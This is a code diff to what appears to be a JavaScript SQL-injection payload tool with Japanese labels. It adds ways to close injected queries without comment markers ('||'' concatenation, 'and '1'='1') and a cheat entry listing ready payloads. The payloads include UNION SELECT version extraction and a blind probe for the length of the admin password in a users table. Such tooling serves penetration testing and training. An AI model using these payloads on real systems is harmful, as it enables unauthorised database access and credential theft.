@@ -131,6 +131,8 @@ const COMMENTS = [
   { v: "#", label: "# (MySQLのみ)" },
   { v: "/*", label: "/* ... (全DBMS・閉じ不要は文末のみ)" },
   { v: ";%00", label: ";%00 (Nullバイト・PHP古き良き時代)" },
+  { v: "||'", label: "||' 連結で閉じる (コメント不要 / SQLite・PG・Oracle・注入点がクエリ末尾前提)" },
+  { v: "and '1'='1", label: "and '1'='1 真偽で閉じる (コメント不要 / 全DBMS)" },
   { v: "", label: "なし (自分で閉じる)" }
 ];
 
@@ -1062,3 +1064,17 @@ const ERR_VERSION_SIGS = {
   oracle: ["Release (\\d+(?:\\.\\d+){2,4})", "Oracle Database (\\d+[a-z]?)"],
   sqlite: ["SQLite version? (\\d+\\.\\d+\\.\\d+)"]
 };
+
+CHEATS.push(
+  {
+    t: "コメント禁止の総まとめ (||' 連結で閉じる)",
+    k: "コメント禁止 閉じる 連結 sqlite_version 終端 quote balance",
+    d: "<ul><li><b>連結で閉じる</b> <code>1' UNION SELECT sqlite_version()||'</code> — 末尾に <code>||'</code> を付けると元クエリの閉じ引用符と繋がって <code>||''</code> になり、クエリがそのまま完結する (SQLite / PG / Oracle。MySQLの <code>||</code> は OR なので結果は変わるが通る)</li><li><b>真偽で閉じる</b> <code>1' and '1'='1</code> — 全DBMS共通。カラム末尾なら <code>...,3 and '1'='1</code> の形も</li><li><b>%00</b> <code>;%00</code> — 古いPHP/APIのみ</li><li>前提: いずれも<b>注入点より後ろに元クエリが残っていない</b> (WHERE id='$id' が最後 etc) こと。後ろに AND/LIMIT が続くなら引用符の数を数えて合わせる必要あり</li><li>UNION/ブラインドの「コメント」選択に <code>||'</code> と <code>and '1'='1</code> を追加済み — 選ぶだけでこの形式のペイロードが出る</li></ul>",
+    p: [
+      "1' UNION SELECT sqlite_version()||'",
+      "1' UNION SELECT 1,sqlite_version(),3||'",
+      "1' AND (SELECT length(pw) FROM users WHERE id='admin')=8 and '1'='1",
+      "1' UNION SELECT version()and' (MySQL・最終カラムが1になる点に注意)"
+    ]
+  }
+);
